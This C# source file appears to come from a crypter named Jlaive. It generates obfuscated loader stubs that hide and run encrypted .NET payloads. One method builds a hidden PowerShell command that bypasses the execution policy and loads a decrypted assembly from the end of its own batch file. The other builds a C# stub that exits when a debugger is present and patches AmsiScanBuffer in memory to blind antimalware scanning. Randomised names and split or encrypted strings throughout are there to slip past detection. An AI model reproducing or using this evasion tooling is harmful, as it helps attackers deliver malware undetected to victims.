using System;
using System.Text;

using static Jlaive.Utils;

namespace Jlaive
{
    public class StubGen
    {
        public static string CreatePS(byte[] key, byte[] iv, bool hidden, Random rng)
        {
            string varname = RandomString(6, rng);
            string varname2 = RandomString(6, rng);
            string srcvarname = RandomString(6, rng);
            string classname = RandomString(6, rng);
            string functionname = RandomString(6, rng);
            string functionname2 = RandomString(6, rng);
            string srcclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text;using System.IO;using System.IO.Compression;using System.Security.Cryptography; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, byte[] key, byte[] iv) { AesManaged aes = new AesManaged(); aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; ICryptoTransform decryptor = aes.CreateDecryptor(key, iv); byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length); decryptor.Dispose(); aes.Dispose(); return decrypted; } public static byte[] " + functionname2 + @"(byte[] bytes) { MemoryStream msi = new MemoryStream(bytes); MemoryStream mso = new MemoryStream(); var gs = new GZipStream(msi, CompressionMode.Decompress); gs.CopyTo(mso); gs.Dispose(); msi.Dispose(); mso.Dispose(); return mso.ToArray(); } }"));
            return $"%~n0.bat.exe -noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ${varname} = (Get-Content -path '%~f0' -raw).Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{srcclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), [System.Convert]::FromBase64String('{Convert.ToBase64String(key)}'), [System.Convert]::FromBase64String('{Convert.ToBase64String(iv)}')))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
        }

        public static string CreateCS(byte[] key, byte[] iv, bool bamsi, bool antidebug, Random rng)
        {
            string namespacename = RandomString(10, rng);
            string classname = RandomString(10, rng);
            string aesfunction = RandomString(10, rng);
            string uncompressfunction = RandomString(10, rng);
            string virtualprotect = RandomString(10, rng);
            string checkremotedebugger = RandomString(10, rng);
            string isdebuggerpresent = RandomString(10, rng);

            string amsiscanbuffer_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), key, iv));
            string checkremotedebugger_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key, iv));
            string isdebuggerpresent_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("IsDebuggerPresent"), key, iv));
            string key_str = Convert.ToBase64String(key);
            string iv_str = Convert.ToBase64String(iv);

            return @"using System;
using System.Diagnostics;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;

namespace " + namespacename + @"
{
    internal class " + classname + @"
    {
        [DllImport(""kernel32.dll"")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        " + (bamsi ? $"delegate bool {virtualprotect}(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);" : string.Empty) + @"
        " + (antidebug ? $"delegate bool {checkremotedebugger}(IntPtr hProcess, ref bool isDebuggerPresent);" : string.Empty) + @"
        " + (antidebug ? $"delegate bool {isdebuggerpresent}();" : string.Empty) + @"

        static void Main(string[] args)
        {
            " + (antidebug || bamsi ? @"IntPtr kmodule = LoadLibrary(""k"" + ""e"" + ""r"" + ""n"" + ""e"" + ""l"" + ""3"" + ""2"" + ""."" + ""d"" + ""l"" + ""l"");" : string.Empty) + @"

            " + (antidebug ?
@"IntPtr crdpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + aesfunction + @"(Convert.FromBase64String(""" + checkremotedebugger_str + @"""), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @"""))));
IntPtr idpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + aesfunction + @"(Convert.FromBase64String(""" + isdebuggerpresent_str + @"""), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @"""))));
" + checkremotedebugger + @" CheckRemoteDebuggerPresent = (" + checkremotedebugger + @")Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(" + checkremotedebugger + @"));
" + isdebuggerpresent + @" IsDebuggerPresent = (" + isdebuggerpresent + @")Marshal.GetDelegateForFunctionPointer(idpaddr, typeof(" + isdebuggerpresent + @"));
bool remotedebug = false;
CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remotedebug);
if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) Environment.Exit(1);" : string.Empty) + @"

            " + (bamsi ?
            @"IntPtr vpaddr = GetProcAddress(kmodule, ""V"" + ""i"" + ""r"" + ""t"" + ""u"" + ""a"" + ""l"" + ""P"" + ""r"" + ""o"" + ""t"" + ""e"" + ""c"" + ""t"");
            " + virtualprotect + @" VirtualProtect = (" + virtualprotect + @")Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(" + virtualprotect + @"));
            IntPtr amsimodule = LoadLibrary(""a"" + ""m"" + ""s"" + ""i"" + ""."" + ""d"" + ""l"" + ""l"");
            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(" + aesfunction + @"(Convert.FromBase64String(""" + amsiscanbuffer_str + @"""), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @"""))));

            byte[] patch;
            if (IntPtr.Size == 8) patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            else patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            uint old;
            VirtualProtect(asbaddr, (UIntPtr)patch.Length, 0x40, out old);
            Marshal.Copy(patch, 0, asbaddr, patch.Length);
            VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);" : string.Empty) + @"

            Assembly asm = Assembly.GetExecutingAssembly();
            StreamReader reader = new StreamReader(asm.GetManifestResourceStream(""payload.txt""));
            string payload = reader.ReadToEnd();
            reader.Dispose();
            MethodInfo entry = Assembly.Load(" + uncompressfunction + @"(" + aesfunction + @"(Convert.FromBase64String(payload), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @""")))).EntryPoint;
            try { entry.Invoke(null, new object[] { args[0].Split(' ') }); }
            catch { entry.Invoke(null, null); }
        }

        static byte[] " + aesfunction + @"(byte[] input, byte[] key, byte[] iv)
        {
            AesManaged aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length);
            decryptor.Dispose();
            aes.Dispose();
            return decrypted;
        }

        static byte[] " + uncompressfunction + @"(byte[] bytes)
        {
            MemoryStream msi = new MemoryStream(bytes);
            MemoryStream mso = new MemoryStream();
            GZipStream gs = new GZipStream(msi, CompressionMode.Decompress);
            gs.CopyTo(mso);
            gs.Dispose();
            mso.Dispose();
            msi.Dispose();
            return mso.ToArray();
        }
    }
}";
        }
    }
}
